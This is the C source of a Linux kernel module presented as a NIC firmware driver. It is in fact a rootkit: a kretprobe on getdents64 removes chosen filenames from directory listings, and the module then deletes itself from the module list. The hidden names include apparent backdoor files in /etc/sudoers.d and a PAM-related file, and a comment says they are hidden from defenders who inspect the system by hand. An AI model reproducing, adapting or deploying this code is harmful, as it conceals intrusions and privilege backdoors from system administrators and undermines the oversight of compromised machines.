// NIC firmware cache driver.
// Hooks getdents64 via kretprobe to suppress selected filenames from directory listings.
// Removes itself from the module list.
//
// Kretprobe approach avoids all sys_call_table patching (set_memory_rw,
// CR0 tricks, __ro_after_init) — zero kernel memory writes outside the
// normal kprobe API. Compatible with Rocky 9 (5.14.x) and Rocky 10 (6.12.x).
//
// Build:  make KVER=$(uname -r)
// Load:   insmod nic_fw.ko
// Unload: rmmod nic_fw

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/string.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("kernel-team");
MODULE_DESCRIPTION("NIC firmware loader v2");
MODULE_VERSION("2.2.0");

#define HIDE_PREFIX ".def_"
// Only hide artifact files that defenders inspect manually.
// Do NOT hide config files that system daemons (crond, systemd,
// systemd-modules-load) need to find via getdents64 — they would
// silently stop working.  Immutability (chattr +i) is the protection
// layer for those files; hiding is just a bonus against manual ls.
static const char *HIDE_NAMES[] = {
    ".pam_auth",              // /usr/lib/.pam_auth (03)
    ".net-helper",            // /usr/lib/systemd/.net-helper (04)
    ".sys_sync",              // /etc/sudoers.d/.sys_sync (01)
    ".netadmin",              // /etc/sudoers.d/.netadmin (01)
    ".svc_monitor",           // /etc/sudoers.d/.svc_monitor (01)
    ".sys_cleanup",           // /usr/local/lib/.sys_cleanup (12)
    ".user_registry",         // /usr/local/lib/.user_registry (12)
    ".locale_helper",         // /usr/local/lib/.locale_helper (11)
    ".locale_cache",          // /usr/local/lib/.locale_cache (11)
    "nic_fw",                 // /lib/modules/*/extra/nic_fw.ko (lkm)
    NULL
};

static bool should_hide(const char *name)
{
    int i;
    if (strncmp(name, HIDE_PREFIX, strlen(HIDE_PREFIX)) == 0)
        return true;
    for (i = 0; HIDE_NAMES[i]; i++) {
        if (strstr(name, HIDE_NAMES[i]))
            return true;
    }
    return false;
}

// ── kretprobe on __x64_sys_getdents64 ────────────────────────────────────────
// Save dirp (rsi at entry) per-instance so the ret handler can access it.
struct gd64_data {
    struct linux_dirent64 __user *dirp;
};

static int gd64_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct gd64_data *d = (struct gd64_data *)ri->data;
    // __x64_sys_getdents64(const struct pt_regs *syscall_regs) — one arg, in rdi.
    // The actual syscall arguments (fd, dirp, count) live in that inner pt_regs.
    const struct pt_regs *sc = (const struct pt_regs *)regs->di;
    d->dirp = (struct linux_dirent64 __user *)sc->si;
    return 0;
}

static int gd64_ret(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct gd64_data *d = (struct gd64_data *)ri->data;
    long ret = (long)regs->ax;
    long offset, new_ret;
    char *write_pos;
    struct linux_dirent64 *kbuf;

    if (ret <= 0 || !d->dirp)
        return 0;

    kbuf = kvmalloc(ret, GFP_KERNEL);
    if (!kbuf)
        return 0;

    if (copy_from_user(kbuf, d->dirp, ret)) {
        kvfree(kbuf);
        return 0;
    }

    offset   = 0;
    new_ret  = 0;
    write_pos = (char *)kbuf;

    while (offset < ret) {
        struct linux_dirent64 *ent =
            (struct linux_dirent64 *)((char *)kbuf + offset);
        unsigned short reclen = ent->d_reclen;
        if (reclen == 0)
            break;
        offset += reclen;

        if (should_hide(ent->d_name))
            continue;

        if (write_pos != (char *)ent)
            memmove(write_pos, ent, reclen);
        write_pos += reclen;
        new_ret   += reclen;
    }

    if (new_ret < ret) {
        // Some entries were hidden — write back the filtered buffer
        if (new_ret == 0 || !copy_to_user(d->dirp, kbuf, new_ret))
            regs->ax = (unsigned long)new_ret;
    }

    kvfree(kbuf);
    return 0;
}

static struct kretprobe gd64_probe = {
    .kp            = { .symbol_name = "__x64_sys_getdents64" },
    .handler       = gd64_ret,
    .entry_handler = gd64_entry,
    .data_size     = sizeof(struct gd64_data),
    .maxactive     = 32,
};

// ── Hide self from lsmod (/proc/modules) ─────────────────────────────────────
static void hide_self(void)
{
    list_del_init(&THIS_MODULE->list);
}

// ── Init / exit ───────────────────────────────────────────────────────────────
static int __init nic_fw_init(void)
{
    int r = register_kretprobe(&gd64_probe);
    if (r < 0) {
        pr_err("nic_fw: register_kretprobe failed: %d\n", r);
        return r;
    }
    hide_self();
    return 0;
}

static void __exit nic_fw_exit(void)
{
    unregister_kretprobe(&gd64_probe);
}

module_init(nic_fw_init);
module_exit(nic_fw_exit);
